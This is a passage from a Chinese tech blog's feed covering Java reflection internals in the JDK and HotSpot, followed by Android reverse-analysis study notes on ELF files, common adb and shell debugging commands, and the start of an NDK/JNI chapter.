&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   // Keep all this slow stuff out of line:
   void slowCheckMemberAccess(Class&amp;amp;lt;?&amp;amp;gt; caller, Class&amp;amp;lt;?&amp;amp;gt; clazz, Object obj, int modifiers,
                              Class&amp;amp;lt;?&amp;amp;gt; targetClass)
       throws IllegalAccessException
   {
       Reflection.ensureMemberAccess(caller, clazz, obj, modifiers);
   
       // Success: Update the cache.
       Object cache = ((targetClass == clazz)
                       ? caller
                       : new Class&amp;amp;lt;?&amp;amp;gt;[] { caller, targetClass });
   
       // Note:  The two cache elements are not volatile,
       // but they are effectively final.  The Java memory model
       // guarantees that the initializing stores for the cache
       // elements will occur before the volatile write.
       securityCheckCache = cache;         // write volatile
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用Reflection.ensureMemberAccess方法继续检查权限，若检查通过就更新缓存，这样下一次同一个类调用同一个方法时就不用执行权限检查了，这是一种简单的缓存机制。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;调用MethodAccessor的invoke方法&lt;/p&gt;

&lt;p&gt;由sun.reflect.MethodAccessor 处理&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   /** This interface provides the declaration for
       java.lang.reflect.Method.invoke(). Each Method object is
       configured with a (possibly dynamically-generated) class which
       implements this interface.
   */
    public interface MethodAccessor {    //是一个接口
       /** Matches specification in {@link java.lang.reflect.Method} */
       public Object invoke(Object obj, Object[] args)
           throws IllegalArgumentException, InvocationTargetException;
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;分析其Usage可得它的具体实现类有:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;sun.reflect.DelegatingMethodAccessorImpl&lt;/li&gt;
&lt;li&gt;sun.reflect.MethodAccessorImpl&lt;/li&gt;
&lt;li&gt;sun.reflect.NativeMethodAccessorImpl&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;methodAccessor实例由reflectionFactory对象操控生成，它在AccessibleObject下的声明如下:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   // Reflection factory used by subclasses for creating field,
   // method, and constructor accessors. Note that this is called
   // very early in the bootstrapping process.
   static final ReflectionFactory reflectionFactory =
       AccessController.doPrivileged(
           new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sun.reflect.ReflectionFactory类的源码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class ReflectionFactory {
       
       private static boolean initted = false;
       private static Permission reflectionFactoryAccessPerm
           = new RuntimePermission(&amp;quot;reflectionFactoryAccess&amp;quot;);
       private static ReflectionFactory soleInstance = new ReflectionFactory();
       // Provides access to package-private mechanisms in java.lang.reflect
       private static volatile LangReflectAccess langReflectAccess;
       
       // 这里设计得非常巧妙
       // &amp;quot;Inflation&amp;quot; mechanism. Loading bytecodes to implement
       // Method.invoke() and Constructor.newInstance() currently costs
       // 3-4x more than an invocation via native code for the first
       // invocation (though subsequent invocations have been benchmarked
       // to be over 20x faster). Unfortunately this cost increases
       // startup time for certain applications that use reflection
       // intensively (but only once per class) to bootstrap themselves.
       // To avoid this penalty we reuse the existing JVM entry points
       // for the first few invocations of Methods and Constructors and
       // then switch to the bytecode-based implementations.
       //
       // Package-private to be accessible to NativeMethodAccessorImpl
       // and NativeConstructorAccessorImpl
       private static boolean noInflation        = false;
       private static int     inflationThreshold = 15;
       
       //......
       
    //这是生成MethodAccessor的方法
       public MethodAccessor newMethodAccessor(Method method) {
           checkInitted();
       
           if (noInflation &amp;amp;&amp;amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {
               return new MethodAccessorGenerator().
                   generateMethod(method.getDeclaringClass(),
                                  method.getName(),
                                  method.getParameterTypes(),
                                  method.getReturnType(),
                                  method.getExceptionTypes(),
                                  method.getModifiers());
           } else {
               NativeMethodAccessorImpl acc =
                   new NativeMethodAccessorImpl(method);
               DelegatingMethodAccessorImpl res =
                   new DelegatingMethodAccessorImpl(acc);
               acc.setParent(res);
               return res;
           }
       }
       
       //......
       
       /** We have to defer full initialization of this class until after
       the static initializer is run since java.lang.reflect.Method&#39;s
       static initializer (more properly, that for
       java.lang.reflect.AccessibleObject) causes this class&#39;s to be
       run, before the system properties are set up. */
       private static void checkInitted() {
           if (initted) return;
           AccessController.doPrivileged(
               new PrivilegedAction&amp;lt;Void&amp;gt;() {
                   public Void run() {
                       // Tests to ensure the system properties table is fully
                       // initialized. This is needed because reflection code is
                       // called very early in the initialization process (before
                       // command-line arguments have been parsed and therefore
                       // these user-settable properties installed.) We assume that
                       // if System.out is non-null then the System class has been
                       // fully initialized and that the bulk of the startup code
                       // has been run.
       
                       if (System.out == null) {
                           // java.lang.System not yet fully initialized
                           return null;
                       }
       
                       String val = System.getProperty(&amp;quot;sun.reflect.noInflation&amp;quot;);
                       if (val != null &amp;amp;&amp;amp; val.equals(&amp;quot;true&amp;quot;)) {
                           noInflation = true;
                       }
       
                       val = System.getProperty(&amp;quot;sun.reflect.inflationThreshold&amp;quot;);
                       if (val != null) {
                           try {
                               inflationThreshold = Integer.parseInt(val);
                           } catch (NumberFormatException e) {
                               throw new RuntimeException(&amp;quot;Unable to parse property sun.reflect.inflationThreshold&amp;quot;, e);
                           }
                       }
       
                       initted = true;
                       return null;
                   }
               });
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;MethodAccessor实现有两个版本，一个是Java版本，一个是native版本 。&lt;/p&gt;

&lt;p&gt;Java实现的版本在初始化时需要较多时间，但长久来说性能较好；native版本正好相反，启动时相对较快，但运行时间长了之后速度就比不过Java版了&lt;/p&gt;

&lt;p&gt;为了尽可能地减少性能损耗，HotSpot JDK采用“inflation”的技巧：让Java方法在被反射调用时，开头若干次使用native版，等反射调用次数超过阈值时则生成一个专用的MethodAccessor实现类，生成其中的invoke()方法的字节码，以后对该Java方法的反射调用就会使用Java版本。 这项优化是从JDK 1.4开始的。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在JVM层面探究invoke0方法&lt;/p&gt;

&lt;p&gt;invoke0方法是一个native方法,它在HotSpot JVM里调用JVM_InvokeMethod函数:&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;          JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0
          (JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args)
          {
              return JVM_InvokeMethod(env, m, obj, args);
          }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;openjdk/hotspot/src/share/vm/prims/jvm.cpp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;JVM_ENTRY(jobject, JVM_InvokeMethod(JNIEnv *env, jobject method, jobject obj, jobjectArray args0))
  JVMWrapper(&amp;quot;JVM_InvokeMethod&amp;quot;);
  Handle method_handle;
  if (thread-&amp;gt;stack_available((address) &amp;amp;method_handle) &amp;gt;= JVMInvokeMethodSlack) {
    method_handle = Handle(THREAD, JNIHandles::resolve(method));
    Handle receiver(THREAD, JNIHandles::resolve(obj));
    objArrayHandle args(THREAD, objArrayOop(JNIHandles::resolve(args0)));
    oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL);
    jobject res = JNIHandles::make_local(env, result);
    if (JvmtiExport::should_post_vm_object_alloc()) {
      oop ret_type = java_lang_reflect_Method::return_type(method_handle());
      assert(ret_type != NULL, &amp;quot;sanity check: ret_type oop must not be NULL!&amp;quot;);
      if (java_lang_Class::is_primitive(ret_type)) {
        // Only for primitive type vm allocates memory for java object.
        // See box() method.
        JvmtiExport::post_vm_object_alloc(JavaThread::current(), result);
      }
    }
    return res;
  } else {
    THROW_0(vmSymbols::java_lang_StackOverflowError());
  }
JVM_END
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;openjdk/hotspot/src/share/vm/runtime/reflection.cpp :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;oop Reflection::invoke_method(oop method_mirror, Handle receiver, objArrayHandle args, TRAPS) {
  oop mirror             = java_lang_reflect_Method::clazz(method_mirror);
  int slot               = java_lang_reflect_Method::slot(method_mirror);
  bool override          = java_lang_reflect_Method::override(method_mirror) != 0;
  objArrayHandle ptypes(THREAD, objArrayOop(java_lang_reflect_Method::parameter_types(method_mirror)));

  oop return_type_mirror = java_lang_reflect_Method::return_type(method_mirror);
  BasicType rtype;
  if (java_lang_Class::is_primitive(return_type_mirror)) {
    rtype = basic_type_mirror_to_basic_type(return_type_mirror, CHECK_NULL);
  } else {
    rtype = T_OBJECT;
  }

  instanceKlassHandle klass(THREAD, java_lang_Class::as_Klass(mirror));
  Method* m = klass-&amp;gt;method_with_idnum(slot);
  if (m == NULL) {
    THROW_MSG_0(vmSymbols::java_lang_InternalError(), &amp;quot;invoke&amp;quot;);
  }
  methodHandle method(THREAD, m);

  return invoke(klass, method, receiver, override, ptypes, rtype, args, true, THREAD);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;Java版的实现&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Java版MethodAccessor的生成使用MethodAccessorGenerator实现  下面是开头的注释：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/** Generator for sun.reflect.MethodAccessor and
    sun.reflect.ConstructorAccessor objects using bytecodes to
    implement reflection. A java.lang.reflect.Method or
    java.lang.reflect.Constructor object can delegate its invoke or
    newInstance method to an accessor using native code or to one
    generated by this class. (Methods and Constructors were merged
    together in this class to ensure maximum code sharing.) */
&lt;/code&gt;&lt;/pre&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析-基础篇④</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</link>
      <pubDate>Sun, 22 Jul 2018 14:15:38 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇④&#34;&gt;一、 基础篇④&lt;/h2&gt;

&lt;h3 id=&#34;第四章-so文件格式解析&#34;&gt;第四章 so文件格式解析&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;ELF文件格式&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;so文件-&amp;gt;elf文件，文件格式看图（引用自@非虫）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/elf_feichong.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;解析工具&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;readelf  常用命令

&lt;ul&gt;
&lt;li&gt;readelf -h xxx.so 查头部信息&lt;/li&gt;
&lt;li&gt;readelf -S xxx.so 查节（Section）信息&lt;/li&gt;
&lt;li&gt;readelf -l xxx.so 查段（Program）信息&lt;/li&gt;
&lt;li&gt;readelf -a xxx.so 查全部信息&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;解析ELF文件&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;动手解析一个elf文件  。。。&lt;/p&gt;

&lt;p&gt;太水 这里的内容&lt;/p&gt;

&lt;p&gt;直接去看源码实现用java解析elf文件信息&lt;a href=&#34;https://github.com/fourbrother/parse_androidso&#34;&gt;https://github.com/fourbrother/parse_androidso&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ELF 相关内容还是单独详细分析 单独写一篇吧&lt;/p&gt;

&lt;p&gt;ELF书籍《&lt;a href=&#34;https://item.jd.com/12240585.html&#34;&gt;Linux二进制分析&lt;/a&gt;》&lt;/p&gt;

&lt;p&gt;### 总结&lt;/p&gt;

&lt;p&gt;加固脱壳必须掌握的知识点。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇③</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</link>
      <pubDate>Mon, 16 Jul 2018 13:51:50 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇③&#34;&gt;一、 基础篇③&lt;/h2&gt;

&lt;h3 id=&#34;第三章-android中开发与逆向常用命令总结&#34;&gt;第三章 Android中开发与逆向常用命令总结&lt;/h3&gt;

&lt;h4 id=&#34;1-基础命令&#34;&gt;1. 基础命令&lt;/h4&gt;

&lt;h5 id=&#34;1-1-cat命令&#34;&gt;1.1 cat命令&lt;/h5&gt;

&lt;p&gt;​   查看文件内容  结合grep进行过滤&lt;/p&gt;

&lt;h5 id=&#34;1-2-echo-touch命令&#34;&gt;1.2 echo/touch命令&lt;/h5&gt;

&lt;p&gt;​   写文件   配个定向符使用&lt;/p&gt;

&lt;h4 id=&#34;2-非shell命令&#34;&gt;2. 非shell命令&lt;/h4&gt;

&lt;h5 id=&#34;2-1-adb-shell-dumpsys-sctivity-top&#34;&gt;2.1 adb shell dumpsys sctivity top&lt;/h5&gt;

&lt;p&gt;​   说明：查看当前应用的activity信息&lt;/p&gt;

&lt;p&gt;​   用法：运行需要查看的应用&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   如果直接运行  &lt;code&gt;adb shell dmpsys&lt;/code&gt;会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的&lt;code&gt;start&lt;/code&gt;命令&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-2-adb-shell-dumpsys-package&#34;&gt;2.2 adb shell dumpsys package&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）&lt;/p&gt;

&lt;p&gt;​   用法：adb shell dumpsys package [pkgname]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-3-adb-shell-dumpsys-meminfo&#34;&gt;2.3 adb shell dumpsys meminfo&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定进程名或者进程id的内存信息&lt;/p&gt;

&lt;p&gt;​   用法：adb shell dumpsys meminfo [pname/pid]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/adnroid-note-3-4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   和后面的top命令结合使用 可以分析应用的性能消耗情况&lt;/p&gt;

&lt;h5 id=&#34;2-4-adb-shell-dump-dbnfo&#34;&gt;2.4 adb shell dump dbnfo&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）&lt;/p&gt;

&lt;p&gt;​   用法：adb shell dump dbnfo [packagename]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716123331.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-5-adb-install&#34;&gt;2.5 adb install&lt;/h5&gt;

&lt;p&gt;​   说明：安装应用包apk文件&lt;/p&gt;

&lt;p&gt;​   用法：adb install [apk文件]&lt;/p&gt;

&lt;p&gt;​   升级安装 使用apk install -r [apk文件]&lt;/p&gt;

&lt;h5 id=&#34;2-6-adb-uninstall&#34;&gt;2.6 adb uninstall&lt;/h5&gt;

&lt;p&gt;​   卸载&lt;/p&gt;

&lt;h5 id=&#34;2-7-adb-pull&#34;&gt;2.7 adb pull&lt;/h5&gt;

&lt;p&gt;​   从设备复制到本地&lt;/p&gt;

&lt;p&gt;​   adb pull 设备目录 本地目录&lt;/p&gt;

&lt;h5 id=&#34;2-8-adb-push&#34;&gt;2.8 adb push&lt;/h5&gt;

&lt;p&gt;​   从本地复制到设备&lt;/p&gt;

&lt;p&gt;​   同上&lt;/p&gt;

&lt;h5 id=&#34;2-9-adb-shell-screencap&#34;&gt;2.9 adb shell screencap&lt;/h5&gt;

&lt;p&gt;​   截屏&lt;/p&gt;

&lt;p&gt;​   adb shell scteencap -p 截图文件目录&lt;/p&gt;

&lt;p&gt;​   快速截取手机屏幕&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bat&#34;&gt;adb shell screencap -p /sdcard/tmp.png
adb pull /sdcard/tmp.png D:\
start D:\tmp.png
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;2-10-adb-shell-screenrecord&#34;&gt;2.10 adb shell screenrecord&lt;/h5&gt;

&lt;p&gt;​   录屏&lt;/p&gt;

&lt;p&gt;​   adb shell screenrecord 路径&lt;/p&gt;

&lt;h5 id=&#34;2-11-adb-shell-input-text&#34;&gt;2.11 adb shell input text&lt;/h5&gt;

&lt;p&gt;​   输入文本内容&lt;/p&gt;

&lt;p&gt;​   adb shell input text [需要输入文本框的内容]&lt;/p&gt;

&lt;p&gt;​   eg: 让输入内容的文本框回去焦点&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;adb shell input text &#39;hello world&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   这个命令可以模拟物理键盘、虚拟键盘、滑动、滚动等事件。&lt;/p&gt;

&lt;h5 id=&#34;2-12-adb-forward&#34;&gt;2.12 adb forward&lt;/h5&gt;

&lt;p&gt;​   端口转发命令&lt;/p&gt;

&lt;p&gt;​   adb forward  [远程协议：端口号]· [设备协议：端口号 ]&lt;/p&gt;

&lt;p&gt;​   eg: adb forward tcp:23946 tcp:23946  IDA 调试&lt;/p&gt;

&lt;p&gt;​         adb  forwrd tcp:8700 jwdp:1786&lt;/p&gt;

&lt;h5 id=&#34;2-13-adb-jdwp&#34;&gt;2.13 adb jdwp&lt;/h5&gt;

&lt;p&gt;​   查看设备中可以被调试的应用的进程号&lt;/p&gt;

&lt;p&gt;​   adb jdwp&lt;/p&gt;

&lt;h5 id=&#34;2-14-adb-logcat&#34;&gt;2.14 adb logcat&lt;/h5&gt;

&lt;p&gt;​   查看当前的日志信息&lt;/p&gt;

&lt;p&gt;​   adb logcat -s tag    eg：&lt;code&gt;adb logcat -s fb&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   adb logcat | findstr pname/pip/keyword&lt;/p&gt;

&lt;p&gt;​   adb logcat | findstr 包&lt;/p&gt;

&lt;p&gt;​   日志信息过滤&lt;/p&gt;

&lt;h4 id=&#34;3-shell-命令&#34;&gt;3. shell 命令&lt;/h4&gt;

&lt;p&gt;这儿shell命令是指先运行adb shell 再执行命令 与非shell命令互通&lt;/p&gt;

&lt;h5 id=&#34;3-1-run-as&#34;&gt;3.1 run-as&lt;/h5&gt;

&lt;p&gt;​   在非root设备中查看指定debug模式的包名应用沙盒数据&lt;/p&gt;

&lt;p&gt;​   run-as [package name]&lt;/p&gt;

&lt;h5 id=&#34;3-2-ps&#34;&gt;3.2 ps&lt;/h5&gt;

&lt;p&gt;​   查看设备进程信息或者指定进程的线程信息&lt;/p&gt;

&lt;p&gt;​   ps | grep 过滤内容&lt;/p&gt;

&lt;p&gt;​   ps -t [pid] 查看pid 对应的线程信息&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h5 id=&#34;3-3-pm-clear&#34;&gt;3.3 pm clear&lt;/h5&gt;

&lt;p&gt;​   清空指定包名的应用数据&lt;/p&gt;

&lt;p&gt;​   pm clear [packagename]&lt;/p&gt;

&lt;h5 id=&#34;3-4-pm-install&#34;&gt;3.4 pm install&lt;/h5&gt;

&lt;p&gt;​   安装设备中的apk 同adb install&lt;/p&gt;

&lt;h5 id=&#34;3-5-pm-uninstall&#34;&gt;3.5 pm uninstall&lt;/h5&gt;

&lt;p&gt;​   卸载&lt;/p&gt;

&lt;h5 id=&#34;3-6-am-start&#34;&gt;3.6 am start&lt;/h5&gt;

&lt;p&gt;​   启动一个应用&lt;/p&gt;

&lt;p&gt;​   am start -n [packname]/[packname].[activity name]&lt;/p&gt;

&lt;p&gt;​   am start -D -n    (以debug方式启动)&lt;/p&gt;

&lt;h5 id=&#34;3-7-am-startservice&#34;&gt;3.7 am startservice&lt;/h5&gt;

&lt;p&gt;​   启动一个服务&lt;/p&gt;

&lt;p&gt;​   am startservice -n [packagename]/[package name].[service name]&lt;/p&gt;

&lt;h5 id=&#34;3-8-am-broadcast&#34;&gt;3.8 am broadcast&lt;/h5&gt;

&lt;p&gt;​   发送一个广播&lt;/p&gt;

&lt;p&gt;​   am broadcast -a [广播动作]&lt;/p&gt;

&lt;h5 id=&#34;3-9-netcfg&#34;&gt;3.9 netcfg&lt;/h5&gt;

&lt;p&gt;​   查看设备的ip地址&lt;/p&gt;

&lt;h5 id=&#34;3-10-netstat&#34;&gt;3.10 netstat&lt;/h5&gt;

&lt;p&gt;​   查看设备的端口号信息&lt;/p&gt;

&lt;h5 id=&#34;3-11-app-process&#34;&gt;3.11 app_process&lt;/h5&gt;

&lt;p&gt;​   运行java代码&lt;/p&gt;

&lt;p&gt;​   app_process [运行代码目录]· [运行主类]&lt;/p&gt;

&lt;p&gt;​   eg:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;export CLASSPATH = /data/demo.jar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;exec /system/bin/app_process /data/cn.wdasdkl.Main&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&#34;3-12-dalvikvm&#34;&gt;3.12 dalvikvm&lt;/h5&gt;

&lt;p&gt;​   运行dex文件&lt;/p&gt;

&lt;p&gt;​   dalvikvm -cp [dex文件] · [运行主类]&lt;/p&gt;

&lt;p&gt;​   差不多同上的用处&lt;/p&gt;

&lt;h5 id=&#34;3-13-top&#34;&gt;3.13 top&lt;/h5&gt;

&lt;p&gt;​   查看当前应用CPU的消耗信息。&lt;/p&gt;

&lt;p&gt;​   top [-n/-m/-d/-s/-t]&lt;/p&gt;

&lt;p&gt;​   -m 最多显示多少个进程&lt;/p&gt;

&lt;p&gt;​   -n 刷新次数&lt;/p&gt;

&lt;p&gt;​   -d 刷新时间间隔&lt;/p&gt;

&lt;p&gt;​   -s 按那一列排序&lt;/p&gt;

&lt;p&gt;​   -t 显示线程信息而不是进程&lt;/p&gt;

&lt;h5 id=&#34;3-14-getprop&#34;&gt;3.14 getprop&lt;/h5&gt;

&lt;p&gt;​   查看系统属性&lt;/p&gt;

&lt;p&gt;​   getprop [属性值名称]&lt;/p&gt;

&lt;p&gt;​   eg：&lt;code&gt;getprop ro.debuggable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   查看设备的信息&lt;/p&gt;

&lt;h4 id=&#34;4-操作apk-命令&#34;&gt;4 操作apk 命令&lt;/h4&gt;

&lt;h5 id=&#34;4-1-用aapt-命令操作apk命令&#34;&gt;4.1 用aapt 命令操作apk命令&lt;/h5&gt;

&lt;p&gt;​   查看apk中的信息以及编辑apk程序包&lt;/p&gt;

&lt;p&gt;​   aapt dump xmltree [apk包] · [需要查看的资源文件]&lt;/p&gt;

&lt;p&gt;​   eg：&lt;code&gt;aapt dump xmltree demp.apk AndroidManifest.xml&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&#34;4-2-用dexdump-操作dex-命令&#34;&gt;4.2 用dexdump 操作dex 命令&lt;/h5&gt;

&lt;p&gt;​   查看dex的详细信息&lt;/p&gt;

&lt;p&gt;​   dexdump [dex文件路径]&lt;/p&gt;

&lt;h4 id=&#34;5-进程命令&#34;&gt;5 进程命令&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;##### 5.1 查看当前进程的内存加载情况
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​   cat  proc/[pid]/maps   查看当前进程的内存映射信息，比如加载了那些so文件，dex文件等等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;5-2-查看进程的状态信息&#34;&gt;5.2 查看进程的状态信息&lt;/h5&gt;

&lt;p&gt;​   cat /proc/[pid]/status&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134609.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;5-3-查看当前应用使用的端口号信息&#34;&gt;5.3 查看当前应用使用的端口号信息&lt;/h5&gt;

&lt;p&gt;​   cat /proc /[pid] / net /     tcp/ tcp6 /udp /udp6&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180716134826.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;​   这章就是一些会用到的命令，后面的学习必不可少的知识点。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇②</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</link>
      <pubDate>Fri, 13 Jul 2018 15:01:09 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/</guid>
      
        <description>

&lt;h1 id=&#34;一-基础篇②&#34;&gt;一、 基础篇②&lt;/h1&gt;

&lt;h2 id=&#34;第二章-android中ndk的开发&#34;&gt;第二章 Android中NDK的开发&lt;/h2&gt;

&lt;h3 id=&#34;1-相关环境&#34;&gt;1.  相关环境&lt;/h3&gt;

&lt;p&gt;相关环境参考另外一篇文章&lt;a href=&#34;https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/&#34;&gt;Android安全和开发环境搭建&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-jni基础&#34;&gt;2.  JNI基础&lt;/h3&gt;

&lt;h4 id=&#34;2-1-第一行代码-书上使用eclipse-我使用as-简单方便很多&#34;&gt;2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多))&lt;/h4&gt;

&lt;p&gt;​   参考文章&lt;a href=&#34;https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/&#34;&gt;Android安全和开发环境搭建&lt;/a&gt;中的JNI开发章节&lt;/p&gt;

&lt;h4 id=&#34;2-2-jnienv类型和jobject类型&#34;&gt;2.2  JNIEnv类型和jobject类型&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AS 默认自动生成&lt;/strong&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-JAVA&#34;&gt; public native String stringFromJNI();
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;Java_com_naivete_jni_1study_MainActivity_stringFromJNI(
        JNIEnv *env,
        jobject /* this */) {
    std::string hello = &amp;quot;Hello from C++&amp;quot;;
    return env-&amp;gt;NewStringUTF(hello.c_str());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;JNIEnv类型&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;通过JNIEnv* 指针就可以对Java端的代码进行操作&lt;/p&gt;

&lt;p&gt;Jni的所有函数可以查看jni.h文件&lt;/p&gt;

&lt;p&gt;下面是一些函数eg：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;NewObject : 创建Java类中的对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;NewString : 创建Java类中的String对象。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;New&lt;Type&gt;Array : 创建类型为Type的数组对象&lt;/p&gt;&lt;/li&gt;

